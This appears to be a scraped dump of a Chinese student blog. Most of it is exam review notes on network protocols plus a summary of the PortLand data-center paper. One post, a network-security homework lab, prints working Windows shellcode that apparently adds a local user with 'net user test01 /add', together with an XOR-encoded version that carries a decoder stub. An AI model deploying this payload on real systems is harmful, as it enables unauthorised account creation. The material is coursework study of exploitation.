Connectionless Service） 连接模式服务（Connection-mode Service） 确认无连接服务（Acknowledged Connectionless Service） 设备厂商将LLC服务作为可选项提供给客户，客户可以根据自己应用的需求选择合适的服务 在大多数情况下，无确认的非连接服务是优先考虑的选项，但在一些不可靠的网络环境，例如无线网络，一般使用确认无连接服务 MAC 功能：寻址/访问控制/差错控制/移动管理等\n重点解决共享链路访问控制问题，具体的MAC机制与传输媒介的物理特性相关\n有线：以太网、光网络等 无线：无线局域网、无线城域网等 CSMA/CD是最经典的MAC机制，在以太网（802.3）中使用\n为什么引入MAC\n寻址问题：在共享链路上，任何主机都能够接收其它主机发送的数据，因此需要一种机制来指明数据的接收者 主机发送数据时以帧为单位，帧的头标中包含了接收这个帧的目的地址，即目的MAC地址 共享链路问题 访问控制问题：在共享链路上，需要一种机制协调所有主机之间的数据发送，以公平竞争访问链路。 解决方法：每个数据帧都有最大长度限制（数据域部分不超过1500字节），发送完后主机之间要重新使用CSMA/CD机制协调对共享链路的访问 冲突 也叫做碰撞，由多台主机争用传输介质引起的。当连接在共享链路上的两台或两台以上主机同时发送数据时，表示这些数据的信号将在同一段传输介质上叠加，从而导致无法被接收主机正确接收。 CSMA/CD 载波侦听（Carrier Sense）：当某台主机想要发送数据时，它首先侦听媒介是否忙，如果是，表示当前有其它主机正在传输数据，因此将继续侦听，直到媒介空闲，然后发送数据 冲突检测（Collision Detection）：如果主机在数据发送过程中检测到冲突，则发送干扰信号（jamming signal），以确保所有主机都知道发生了冲突，并且取消发送 当检测冲突后，将等待一个随机的时间，也称作退避（backoff） 二进制指数退避算法（binary exponential backoff）来确定随机等待时间时间被划分为离散的时槽，一般设置为51.2us 当第k次冲突发生后，从集合{0，1，….，2k-1}中随机选择一个数r，然后等待r个时槽。如果k\u0026gt;=10，则保持集合{0，1，….，210-1} 不变。如果k\u0026gt;16，则放弃发送，并产生错误 分布式协调功能DCF（Distributed Coordination Function） 冲突避免CA而不是冲突检测CD，在无线环境下很难检测到冲突 两种CSMA/CA操作\n基本CSMA/CA：采用物理信道侦听方法 ，该操作强制要求必须使用 扩展CSMA/CA：采用虚拟信道侦听方法，使用两个控制帧，即RTS/CTS，可解决隐藏站点问题，该操作是可选的，可以根据需要配置 基本CSMA/CA 包括载波侦听和冲突避免两个过程 载波侦听 ：站点在发送帧之前侦听无线信道是否空闲，如果是，则进入冲突避免阶段，如果当前信道忙，说明现在有其它站点正在传输数据，则延迟发送帧直到侦听到信道空闲 冲突避免：站点在发送帧之前要先等待一个帧间间隔IFS（InterFrame Spacing），并且确保在IFS时间内信道空闲 为了防止多个站点在等待IFS时间后同时发送而导致冲突，与以太网类似，引入了一个随机退避算法来选择一个退避时间 （backoff time） IFS 帧间间隔（IFS）控制了发送帧之前的等待时间，不同类型的帧具有不同的IFS，确定了帧的发送优先级，IFS越短，帧的优先级就越高 。 三种IFS\nSIFS：Short IFS，最高优先级，用于CTS、ACK等控制帧 PIFS：PCF IFS，等于SIFS+1，中等优先级，用于PCF操作模式下的帧 DIFS：DCF IFS，等于SIFS+2，最低优先级，用于DCF操作模式下的数据帧 退避时间 站点执行随机退避算法来确定退避时间 从0到竞争窗口CW之间的随机选择一个值r，则退避时间为r倍的时槽 竞争窗口CW（Contention Window ）采用与以太网类似的指数退避算法来设置 CW初始化为一个最小值CWmin 当发送方认为发送的帧发生冲突时将CW加倍增大，直到到达最大值CWmax 竞争窗口CW: 开始为2k-1，下一次为2k+1-1 判断冲突 .接收方发送ACK帧 接收方正确接收来自发送方的数据帧后发送ACK帧进行确认 ACK帧不需要执行随机退避算法，而是直接等待一个SIFS时间后就发送 发送方未收到ACK帧 发送方执行指数退避算法，将CW的值加倍，并且将重传计数器加1，然后重传数据帧，此时需要再次使用CSMA/CA机制竞争信道 CW从CWmin开始，每次重传都将CW加倍，直到到达CWmax 重传计数器到达一个设定的门限值时，发送方将放弃发送数据帧，并且返回一个错误 扩展CSMA/CA RTS帧：与数据帧发送方式相同 CTS帧：与控制帧发送方式相同，等待SIFS时间后直接发送 网络分配向量（NAV：Network Allocation Vector）：设置计数器，当减为0后，其他站点开始竞争信道 只有当RTS/CTS中的持续时间域的值大于当前存储的NAV时，该NAV才会被更新 原理 ![[Pasted image 20240102111606.png]]\n发送方发送RTS帧，其中包含了一个持续时间域，该域的值表明发送方完成帧交换所需要的时间，包括从发送数据帧到接收ACK帧所需要的时间 收到RTS的站点根据其中的持续时间为自己声明一个虚拟信道，并且该信道正忙，用网络分配向量NAV来表示，在NAV时间内，该站点不会尝试发送帧 接收方响应CTS帧中也包含一个持续时间域，该域的值足够大，以保证发送方能够完成数据帧交换 收到CTS的站点根据其中的持续时间为自己声明一个虚拟信道，并且该信道正忙，用网络分配向量NAV来表示，在NAV时间内，该站点不会尝试发送帧 为什么要拓展 基本CSMA/CA存在：\n隐藏站点问题：B给C发，D无法侦听到 暴露站点问题：B给A发，C侦听到忙，无法给D发 扩展CSMA/CA可解决隐藏站点问题 B和D在彼此通信范围之外，他们互为隐藏站点，当B往C发送时，D CD失败，反过来D往C发送时，B CD失败。基本的CSMA/CA机制无法解决隐藏站点问题 切换 •站点移出一个AP的信号覆盖范围外，进入另一个AP的信号覆盖范围内，这时它需要关联到一个新的AP上。这个过程被称为切换（Handoff）\n切换过程 首先，站点决定何时开始切换过程 信号强度减弱 帧重传 基础设施网络中无法接收到AP周期性广播的信标帧（缺省情况下AP周期性广播信标帧，其中包含有SSID等信息） 其次，站点决定切换到何处 通过扫描机制得到所有AP的信息 主动扫描速度快,但是开销大,目前大多数802.11产品都采用主动扫描 主动扫描(Active Scanning)：在每个信道上发送探测请求帧，然后等待来自工作在该信道上的AP的探测响应帧，从而得到所有信道上的所有AP信息 被动扫描(Passive Scanning): 在每个信道上侦听来自AP的信标帧，从而得到所有信道上的所有AP信息 根据SSID是否匹配、信号强度等信息选择一个新的AP 最后，站点将和选择的新的AP建立关联。建立关联之前STA还要和新的AP进行认证过程，然后开始关联过程 在这里站点发送的是重新关联帧（Reassociation ）而不是关联帧 PON关键技术 下行采用广播方式传输，为保证安全性，需要对数据进行加密 上行需要考虑TDMA同步问题 实现动态带宽分配，提高带宽使用率，保证多业务服务质量 PON要解决的关键问题就是如何控制多个ONU/ONT对共享馈线光纤的高效访问 GPON vs EPON EPON直接将变长IP分组封装成以太帧，效率高，实现简单 GPON帧长为125us，无缝支持TDM业务 GPON继承了ATM的多业务支持，以业务类型为单位分配带宽 动态带宽分配属于GPON标准的一部分，但是在EPON中没有明确定义 GPON能够提供更高的速率，接入更多的ONU/ONT（最多128个）\n","date":"2024-01-02T11:54:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%BA%8C%E7%AB%A0/","title":"信息网络协议基础第二章复习"},{"content":"交换技术 交换、电路交换、分组交换（虚电路交换ATM、数据报交换IP）- 原理 特点 为什么需要交换？ 减少网络中节点之间所需的通信线路 增强可扩展性,构建更大规模网络\n交换类型 ![[Pasted image 20240101134814.png]]\n交换的概念 交换操作由一系列过程组成：为输入数据选择输出线路/端口，在输入和输出之间建立连接，通过该连接将数据放到输出线路/端口上 网络中执行交换操作的设备称为交换机。通过一系列交换机的交换操作，在两个通信节点之间建立一条数据传输路径，这条路径由物理或者逻辑上的链路组成\n电路交换 电路交换：概念 交换传输线路或者时隙，通过交换机在通信双方之间建立一条专用的传输路径 传输路径建立后，数据像流一样在路径上传输 空分交换：传输路径由线路组成 时分交换：传输路径由每条线路上的固定时隙组成 电路交换：特征 网络通信包括三个过程\n（发送）端到（接收）端电路连接建立 数据传输 电路连接拆除 优点：占用固定的线路资源，保证数据传输的速率、延时、可靠性及有序性 缺点：线路资源利用率低，没有有数据传输时也占用线路或者固定时隙；电路连接建立导致延迟 电路交换：性能 电路交换是为话音传输设计的，支持固定的数据速率 电话交换网：传统电话网络中的话音业务采用电路交换技术，除端局到用户的本地回路(Subscriber Loop)是模拟的以外，其它部分都是数字的。 分组交换 分组交换：概念 交换分组，以分组为单元统计复用线路（也称为链路）资源\n统计复用：只有有数据要传输才占用线路 分组大小问题：太小，分组开销大；太大，复用效率低，影响其它分组的发送 现代的电话网络支持话音、数据等综合业务，对于数据采用分组交换技术 数据报交换 数据报交换：直接发送分组\n特征 无连接：直接发送分组，无服务质量保证 健壮性：相同源-目的的分组可能沿不同路径传输，可绕开故障路径 路由表 分组携带的控制信息中包含目的地址 目的地址在传输过程中保持不变 交换机根据路由表来独立地转发分组 使用目的地址来查找 性能 IP网络采用数据报交换，在网络层执行交换，交换的单元为IP分组，执行交换的设备也被称为IP路由器 虚电路交换 虚电路交换：先建立连接，再发送分组\n特征 面向连接：分组发送前在源和目的之间建立连接 与电路交换不同，连接不是占用固定的线路资源，只是告诉网络的资源需求，在每个交换机上建立“连接状态” 建立的连接路径被称为虚电路（Virtual Circuit） 服务质量保证 有序性：同一源和目的的分组沿相同的路径到达目的地 基于虚电路标识执行交换操作，效率高 虚电路 VCI（VC Identifier）：在每条物理线路/链路可以同时运行很多条虚电路，每条虚电路由VCI标识 VCI具有局部意义，只在每条链路上唯一 每个交换机上都维护一个转发表，基于VCI对分组进行转发 从源到目的的虚电路由路径链路上一系列VCI标识 ![[Pasted image 20240101134653.png]] 性能 ATM网络采用虚电路交换，交换的单元为固定长度的ATM 信元，执行交换的设备也被称为ATM交换机 总结 以分组为单元统计复用线路/链路资源 优点：线路利用率高，节点只有在有数据要传输时才占用通信线路，因此多个节点的分组可以共享一条通信线路 缺点：需要资源管理机制来保证数据传输的速率、延时、可靠性和有序性，增加了复杂性 分组交换是为数据传输设计的，支持可变的数据速率 网络体系结构 DTN体系架构 解决的问题 传统网络路由假设：在任何时候，总能找到从源到目的的端到端路径。 DTN网络环境：由于连接的间隙性，可能会出现端到端路径不存在的情况 基本思想：走一步看一步，而不像传统路由那样直接找到从源到目的的路径。关键问题：下一步如何确定？ 最简单的策略：把数据交给我当前能通信的所有节点（感染路由），性能最好，开销最大！ 更复杂的策略：根据一些知识来选择数据转发的下一跳（单拷贝/多拷贝路由），例如历史相遇信息，节点运动信息等，这可以减小开销，但是性能会下降。 DTN中引入了Bundle Protocol （BP），可以在TCP/IP和非TCP/IP网络中运行，BP实现Custody Transfer SDN 当前网络问题 网络缺乏灵活的控制机制 基本思想： 数据面和控制面分离，数据路由传输由控制器控制，赋予外部应用通过控制器控制网络设备的能力 openflow OpenFlow是SDN的一种实现，定义了控制器和交换机/路由器之间的协议，以及交换机/路由器的控制接口、流表格式等 现有Internet存在的问题 可扩展性：流量增加、路由表膨胀 移动性：越来越多的移动用户接入到Internet，在设计时未考虑移动性支持 服务质量：IP网络提供的是尽力投递服务，未考虑数据内容 网络安全：越来越多的应用使用Internet，在设计时并未充分考虑安全性 能耗：互联网耗电量约占全球的5.4%，我国是4.3%，还在不断增长 Internet体系结构本生存在问题，无法彻底解决这些问题！重新设计Internet体系结构！ NSF Future Internet Architecture Program •Founded in 2010, design for next 15 years\nNamed Data Networking MobilityFirst NEBULA/eXpressive Internet Architecture/ChoiceNet 基本特征：除了数据传输，网络具有更多的能力，例如内容计算、内容存储等，而且网络更加灵活可变，例如可编程等 NDN Named Data Networking\n当前网络问题 路由器不知道传输的内容导致冗余传输，从而浪费带宽，增加能耗 设计思路 用户关注的是内容，而不是内容在什么地方：内容名取代地址 通过内容命名，可以实现自动缓存来优化带宽 在安全性方面，NDN确保的是内容安全，而不是内容所在处的安全 MobilityFirst 解决的问题 网络节点身份和位置标识相同（IP地址） 设计 GUID - Mapping ![[Pasted image 20240101140521.png]] GUID:Globally Unique Name 表示节点身份的标识和表示节点位置的地址分离 通过路由器缓存来减少移动过程中的数据丢失 每次更换地址 (1)Update GUID - Address Mapping (2)Direct traffic to new address 未来网络应用场景和需求：网络5.0 以物联网、云计算、大数据和人工智能为核心 工业互联网、车联网、远程医疗、智能电网 5G网络，解决低延迟、移动性和大连接问题 超高带宽、延迟保证 ","date":"2024-01-02T08:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%B8%80%E7%AB%A0/","title":"信息网络协议基础第一章复习"},{"content":" 题型：简答题问答题\n往年题合集： 试卷合集\n整理的小抄：A4小抄\n第一章 信息网络概述 ﻿交换技术 交换、电路交换、分组交换（虚电路交换ATM、数据报交换IP） 原理 特点 为什么需要交换？ 减少网络中节点之间所需的通信线路 增强可扩展性,构建更大规模网络\n交换的概念 交换操作由一系列过程组成：为输入数据选择输出线路/端口，在输入和输出之间建立连接，通过该连接将数据放到输出线路/端口上 网络中执行交换操作的设备称为交换机。通过一系列交换机的交换操作，在两个通信节点之间建立一条数据传输路径，这条路径由物理或者逻辑上的链路组成\n电路交换：概念 交换传输线路或者时隙，通过交换机在通信双方之间建立一条专用的传输路径 传输路径建立后，数据像流一样在路径上传输 空分交换：传输路径由线路组成 时分交换：传输路径由每条线路上的固定时隙组成 电路交换：特征 网络通信包括三个过程\n（发送）端到（接收）端电路连接建立 数据传输 电路连接拆除 优点：占用固定的线路资源，保证数据传输的速率、延时、可靠性及有序性 缺点：线路资源利用率低，没有有数据传输时也占用线路或者固定时隙；电路连接建立导致延迟 电路交换：性能 网络体系结构 ﻿现有网络体系结构面临哪些主要挑战？有哪些主要的解决方案？ 第二章 接入网技术 接入网架构 ﻿常用接入网络类型有哪些？各自有什么特点？ ﻿﻿802.11无线局域网 - 共享、资源利用率高、成本低 - 共享信道的访问控制机制 - 覆盖范围 ﻿基本CSMA/CA原理、扩展CSMA/CA原理 RTS、CTS ﻿站点切换过程 无源光接入网 ﻿PON网络架构、关键技术 ATM的apon 以太网EPON 第三章IPv6协议 NATA\\CIDR ﻿﻿NAT技术原理及其局限性 ﻿﻿前缀汇聚、前缀最长匹配规则； 学会汇聚 带来问题：路由匹配到多个表项 ﻿﻿路由表配置 使得路由表项最少 ﻿﻿IPv6地址 ﻿﻿链路局部地址、全局地址、常用组播地址（全节点、全路由器、被请求节点）\n地址范围 被请求节点地址是邻居发现机制非常重要的地址 ﻿﻿IPv6邻居发现机制\n地址解析、地址重复检测、路由器发现 ﻿﻿基于EUI-64地址的IPv6地址自动配置过程 ﻿﻿IPv4/IPv6过渡机制\n﻿﻿手动隧道配置、自动隧道（ISATAP、6to4）原理和配置 掌握基本的IP网络配置，包括地址、路由等 注意实验\n第四章IP网络移动管理 重新配置ip地址\n移动切换 网络层切换与链路层切换 ﻿﻿移动IPv6 ﻿基本原理、如何对上层应用屏蔽移动性？ ﻿可以优化的地方？ ﻿﻿PMIPv6 ﻿引入原因及原理 第五章IP网络服务质量 ﻿基本概念 服务质量度量：延迟、带宽、丢包率 QoS度量参数；流、行为集合、服务等级协议 支持QoS操作的路由器功能 接纳控制 流量调节 流量控制 两个服务质量模型 ﻿综合服务原理，综合服务类型\n﻿区分服务原理，EF PHB和AF PHB\n第六章 路由和交換 路由器功能与架构 ﻿路由查找算法 ﻿﻿Binary Trie、Leaf Pushing、LC Trie （Multi-Bit Trie, PathCompression）、Tree Bitmap的原理和采用的数据结构 ﻿﻿交换结构 ﻿﻿路由器吞吐量和加速、内部阻塞和输出端口竞争的概念 ﻿﻿3代交换结构 ﻿﻿Banyan交换结构 ﻿﻿输入队列与输出队列 ","date":"2024-01-02T00:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/","title":"信息网络复习提纲"},{"content":"得分10/10\n修改源代码 ![[IMG_2949.png]]\nshellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 Z:\\toStudentCh11-3\u0026gt;GetShellcode.exe /* 292=0x124 bytes */ \u0026#34;\\x33\\xc0\\x50\\x68\\x2f\\x61\\x64\\x64\\x68\\x74\\x30\\x31\\x20\\x68\\x20\\x74\u0026#34; \u0026#34;\\x65\\x73\\x68\\x75\\x73\\x65\\x72\\x68\\x65\\x78\\x65\\x20\\x68\\x6e\\x65\\x74\u0026#34; \u0026#34;\\x2e\\x68\\x70\\x61\\x64\\x2e\\x68\\x6e\\x6f\\x74\\x65\\x8b\\xfc\\x68\\x57\\x66\u0026#34; \u0026#34;\\x0d\\xff\\x68\\x63\\x89\\xd1\\x4f\\x68\\xc9\\xbc\\xa6\\x6b\\x5a\\xe8\\x56\\x00\u0026#34; \u0026#34;\\x00\\x00\\x8b\\xf0\\x5a\\xe8\\x4e\\x00\\x00\\x00\\x8b\\xd8\\xe8\\x05\\x00\\x00\u0026#34; \u0026#34;\\x00\\xe9\\xce\\x00\\x00\\x00\\x51\\x52\\x56\\x57\\x55\\x8b\\xec\\x8b\\xd7\\x83\u0026#34; \u0026#34;\\xec\\x54\\x8b\\xfc\\x6a\\x14\\x59\\x33\\xc0\\x89\\x04\\x8f\\xe2\\xfb\\xc6\\x47\u0026#34; \u0026#34;\\x10\\x44\\x8d\\x47\\x10\\x57\\x50\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a\u0026#34; \u0026#34;\\x00\\x6a\\x00\\x52\\x6a\\x00\\xff\\xd6\\x83\\xf8\\x00\\x74\\x03\\x50\\xff\\xd3\u0026#34; \u0026#34;\\x8b\\xe5\\x5d\\x5f\\x5e\\x5a\\x59\\xc3\\x56\\x53\\x51\\x52\\xe8\\x11\\x00\\x00\u0026#34; \u0026#34;\\x00\\x83\\xf8\\x00\\x7e\\x07\\x8b\\xd8\\xe8\\x17\\x00\\x00\\x00\\x5a\\x59\\x5b\u0026#34; \u0026#34;\\x5e\\xc3\\x64\\xa1\\x30\\x00\\x00\\x00\\x8b\\x40\\x0c\\x8b\\x40\\x1c\\x8b\\x00\u0026#34; \u0026#34;\\x8b\\x40\\x08\\xc3\\x8b\\x43\\x3c\\x8b\\x44\\x18\\x78\\x03\\xc3\\x8b\\xf0\\x8b\u0026#34; \u0026#34;\\x4e\\x18\\x8b\\x46\\x20\\x03\\xc3\\x8b\\x44\\x88\\xfc\\x03\\xc3\\x57\\x8b\\xf8\u0026#34; \u0026#34;\\xe8\\x17\\x00\\x00\\x00\\x5f\\x3b\\xc2\\x74\\x06\\xe2\\xe6\\x33\\xc0\\xeb\\x0b\u0026#34; \u0026#34;\\x8b\\x46\\x1c\\x03\\xc3\\x8b\\x44\\x88\\xfc\\x03\\xc3\\xc3\\x53\\x51\\x52\\x57\u0026#34; \u0026#34;\\x33\\xd2\\x0f\\xbe\\x07\\x83\\xf8\\x00\\x74\\x13\\x8b\\xda\\x8b\\xca\\xc1\\xe3\u0026#34; \u0026#34;\\x19\\xc1\\xe9\\x07\\x0b\\xd9\\x8b\\xd3\\x03\\xd0\\x47\\xeb\\xe5\\x8b\\xc2\\x5f\u0026#34; \u0026#34;\\x5a\\x59\\x5b\\xc3\u0026#34;; XorByte=0xfe /* 292=0x124 bytes */ \u0026#34;\\xcd\\x3e\\xae\\x96\\xd1\\x9f\\x9a\\x9a\\x96\\x8a\\xce\\xcf\\xde\\x96\\xde\\x8a\u0026#34; \u0026#34;\\x9b\\x8d\\x96\\x8b\\x8d\\x9b\\x8c\\x96\\x9b\\x86\\x9b\\xde\\x96\\x90\\x9b\\x8a\u0026#34; \u0026#34;\\xd0\\x96\\x8e\\x9f\\x9a\\xd0\\x96\\x90\\x91\\x8a\\x9b\\x75\\x02\\x96\\xa9\\x98\u0026#34; \u0026#34;\\xf3\\x01\\x96\\x9d\\x77\\x2f\\xb1\\x96\\x37\\x42\\x58\\x95\\xa4\\x16\\xa8\\xfe\u0026#34; \u0026#34;\\xfe\\xfe\\x75\\x0e\\xa4\\x16\\xb0\\xfe\\xfe\\xfe\\x75\\x26\\x16\\xfb\\xfe\\xfe\u0026#34; \u0026#34;\\xfe\\x17\\x30\\xfe\\xfe\\xfe\\xaf\\xac\\xa8\\xa9\\xab\\x75\\x12\\x75\\x29\\x7d\u0026#34; \u0026#34;\\x12\\xaa\\x75\\x02\\x94\\xea\\xa7\\xcd\\x3e\\x77\\xfa\\x71\\x1c\\x05\\x38\\xb9\u0026#34; \u0026#34;\\xee\\xba\\x73\\xb9\\xee\\xa9\\xae\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\u0026#34; \u0026#34;\\xfe\\x94\\xfe\\xac\\x94\\xfe\\x01\\x28\\x7d\\x06\\xfe\\x8a\\xfd\\xae\\x01\\x2d\u0026#34; \u0026#34;\\x75\\x1b\\xa3\\xa1\\xa0\\xa4\\xa7\\x3d\\xa8\\xad\\xaf\\xac\\x16\\xef\\xfe\\xfe\u0026#34; \u0026#34;\\xfe\\x7d\\x06\\xfe\\x80\\xf9\\x75\\x26\\x16\\xe9\\xfe\\xfe\\xfe\\xa4\\xa7\\xa5\u0026#34; \u0026#34;\\xa0\\x3d\\x9a\\x5f\\xce\\xfe\\xfe\\xfe\\x75\\xbe\\xf2\\x75\\xbe\\xe2\\x75\\xfe\u0026#34; \u0026#34;\\x75\\xbe\\xf6\\x3d\\x75\\xbd\\xc2\\x75\\xba\\xe6\\x86\\xfd\\x3d\\x75\\x0e\\x75\u0026#34; \u0026#34;\\xb0\\xe6\\x75\\xb8\\xde\\xfd\\x3d\\x75\\xba\\x76\\x02\\xfd\\x3d\\xa9\\x75\\x06\u0026#34; \u0026#34;\\x16\\xe9\\xfe\\xfe\\xfe\\xa1\\xc5\\x3c\\x8a\\xf8\\x1c\\x18\\xcd\\x3e\\x15\\xf5\u0026#34; \u0026#34;\\x75\\xb8\\xe2\\xfd\\x3d\\x75\\xba\\x76\\x02\\xfd\\x3d\\x3d\\xad\\xaf\\xac\\xa9\u0026#34; \u0026#34;\\xcd\\x2c\\xf1\\x40\\xf9\\x7d\\x06\\xfe\\x8a\\xed\\x75\\x24\\x75\\x34\\x3f\\x1d\u0026#34; \u0026#34;\\xe7\\x3f\\x17\\xf9\\xf5\\x27\\x75\\x2d\\xfd\\x2e\\xb9\\x15\\x1b\\x75\\x3c\\xa1\u0026#34; \u0026#34;\\xa4\\xa7\\xa5\\x3d\u0026#34;; Success: encode is OK length of shellcode = 315 = 0x13b /* 315=0x13b bytes */ \u0026#34;\\xeb\\x10\\x5b\\x53\\x4b\\x33\\xc9\\x66\\xb9\\x24\\x01\\x80\\x34\\x0b\\xfe\\xe2\u0026#34; \u0026#34;\\xfa\\xc3\\xe8\\xeb\\xff\\xff\\xff\\xcd\\x3e\\xae\\x96\\xd1\\x9f\\x9a\\x9a\\x96\u0026#34; \u0026#34;\\x8a\\xce\\xcf\\xde\\x96\\xde\\x8a\\x9b\\x8d\\x96\\x8b\\x8d\\x9b\\x8c\\x96\\x9b\u0026#34; \u0026#34;\\x86\\x9b\\xde\\x96\\x90\\x9b\\x8a\\xd0\\x96\\x8e\\x9f\\x9a\\xd0\\x96\\x90\\x91\u0026#34; \u0026#34;\\x8a\\x9b\\x75\\x02\\x96\\xa9\\x98\\xf3\\x01\\x96\\x9d\\x77\\x2f\\xb1\\x96\\x37\u0026#34; \u0026#34;\\x42\\x58\\x95\\xa4\\x16\\xa8\\xfe\\xfe\\xfe\\x75\\x0e\\xa4\\x16\\xb0\\xfe\\xfe\u0026#34; \u0026#34;\\xfe\\x75\\x26\\x16\\xfb\\xfe\\xfe\\xfe\\x17\\x30\\xfe\\xfe\\xfe\\xaf\\xac\\xa8\u0026#34; \u0026#34;\\xa9\\xab\\x75\\x12\\x75\\x29\\x7d\\x12\\xaa\\x75\\x02\\x94\\xea\\xa7\\xcd\\x3e\u0026#34; \u0026#34;\\x77\\xfa\\x71\\x1c\\x05\\x38\\xb9\\xee\\xba\\x73\\xb9\\xee\\xa9\\xae\\x94\\xfe\u0026#34; \u0026#34;\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\xac\\x94\\xfe\\x01\\x28\\x7d\u0026#34; \u0026#34;\\x06\\xfe\\x8a\\xfd\\xae\\x01\\x2d\\x75\\x1b\\xa3\\xa1\\xa0\\xa4\\xa7\\x3d\\xa8\u0026#34; \u0026#34;\\xad\\xaf\\xac\\x16\\xef\\xfe\\xfe\\xfe\\x7d\\x06\\xfe\\x80\\xf9\\x75\\x26\\x16\u0026#34; \u0026#34;\\xe9\\xfe\\xfe\\xfe\\xa4\\xa7\\xa5\\xa0\\x3d\\x9a\\x5f\\xce\\xfe\\xfe\\xfe\\x75\u0026#34; \u0026#34;\\xbe\\xf2\\x75\\xbe\\xe2\\x75\\xfe\\x75\\xbe\\xf6\\x3d\\x75\\xbd\\xc2\\x75\\xba\u0026#34; \u0026#34;\\xe6\\x86\\xfd\\x3d\\x75\\x0e\\x75\\xb0\\xe6\\x75\\xb8\\xde\\xfd\\x3d\\x75\\xba\u0026#34; \u0026#34;\\x76\\x02\\xfd\\x3d\\xa9\\x75\\x06\\x16\\xe9\\xfe\\xfe\\xfe\\xa1\\xc5\\x3c\\x8a\u0026#34; \u0026#34;\\xf8\\x1c\\x18\\xcd\\x3e\\x15\\xf5\\x75\\xb8\\xe2\\xfd\\x3d\\x75\\xba\\x76\\x02\u0026#34; \u0026#34;\\xfd\\x3d\\x3d\\xad\\xaf\\xac\\xa9\\xcd\\x2c\\xf1\\x40\\xf9\\x7d\\x06\\xfe\\x8a\u0026#34; \u0026#34;\\xed\\x75\\x24\\x75\\x34\\x3f\\x1d\\xe7\\x3f\\x17\\xf9\\xf5\\x27\\x75\\x2d\\xfd\u0026#34; \u0026#34;\\x2e\\xb9\\x15\\x1b\\x75\\x3c\\xa1\\xa4\\xa7\\xa5\\x3d\u0026#34;; 命令成功完成。 Z:\\toStudentCh11-3\u0026gt; 查看用户 ","date":"2023-12-23T11:28:18+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A7/","title":"网络安全作业7"},{"content":"PortLand: a scalable fault-tolerant layer 2 data center network fabric 💡 Meta Data Title\nPortLand: a scalable fault-tolerant layer 2 data center network fabric\nJournal\nAuthors\nRadhika Niranjan Mysore; Andreas Pamboris; Nathan Farrington; Nelson Huang; Pardis Miri; Sivasankar Radhakrishnan; Vikram Subramanya; Amin Vahdat\nPub. date\n八月 16, 2009\n期刊标签\nDOI\n10.1145/1592568.1592575\n附件\nNiranjan Mysore 等 - 2009 - PortLand a scalable fault-tolerant layer 2 data c.pdf\n📜 研究背景 \u0026amp; 基础 \u0026amp; 目的 这篇论文的研究背景是针对日益增长的数据中心网络中存在的限制和挑战，例如在现有的层2和层3网络协议在支持大规模数据中心中的灵活性、效率和容错性方面存在的局限性 在笔者提出的论文中，研究的基础是现有网络协议在面临未来单个站点拥有数百万虚拟终端的数据中心时所面临的挑战，特别是关注于如何在这种大规模环境中实现可扩展、易管理、容错和高效的数据中心网络结构\n论文的目的是设计和实现一种名为PortLand的协议，该协议旨在解决现有网络在数据中心部署中的局限性，通过提供一种可扩展、容错、并适用于数据中心环境的层2路由和转发协议通过PortLand协议的设计和实施，论文的目的是展示该协议能够支持“即插即用”的大规模数据中心网络，并为数据中心网络提供更灵活、高效和容错的解决方案\nARP是地址解析协议（Address Resolution Protocol），用于将IP地址映射成对应的MAC地址的协议。在局域网中，当一台设备需要发送数据给另一台设备时，它会使用ARP来获取目标设备的MAC地址，以便将数据发送到正确的目标。ARP协议在以太网和其他局域网技术中广泛使用。\n📊 研究内容 PMAC是如何设计的\nPMAC（Pseudo MAC）地址的设计是基于一种层次化的编码方式。在PortLand中，每个主机被分配一个唯一的PMAC地址，该地址编码了主机在拓扑结构上的位置。例如，在同一个pod中的所有终节点的PMAC地址具有相同的前缀。主机保持不变，认为它们仍然使用其实际的MAC地址（AMAC）。当主机发送ARP请求时，它们接收到目标主机的PMAC地址[5a]。所有的数据包转发都是基于PMAC地址进行的，这样可以实现非常小的转发表。发送数据包时，出口交换机会对PMAC地址进行重写，将其转换为目标主机的AMAC地址，以保持主机不变的MAC地址的幻象。\n步骤1：当入口交换机首次看到源MAC地址时，会将数据包传送到交换机。\n步骤2a：软件在本地PMAC表中创建一个条目，将主机的AMAC和IP地址映射到其PMAC。边缘交换机决定PMAC。\n步骤2b：交换机将此映射通信给“Fabric Manager”。\n步骤3：“Fabric Manager”使用此状态来响应ARP请求。交换机还会创建适当的流表条目，将 PMAC 目标地址重写为 AMAC，以便对任何发送到主机的流量重写PMAC目的地地址。\nProxy-based ARP “Ethernet by default broadcasts ARPs to all hosts in the same layer 2 domain. We leverage the fabric manager to reduce broadcast overhead in the common case, as depicted in Figure 3. In step 1, an edge switch intercepts an ARP request for an IP to MAC address mapping and forwards the request to the fabric manager in step 2. The fabric manager consults its PMAC table to see if an entry is available for the target IP address. If so, it returns the PMAC in step 3 to the edge switch. The edge switch creates an ARP reply in step 4 and returns it to the original host.” (Niranjan Mysore 等, 2009, p. 43) 🔤以太网默认情况下会向同一第 2 层域中的所有主机广播 ARP。如图 3 所示，我们利用结构管理器来减少普通情况下的广播开销。在步骤 1 中，边缘交换机拦截 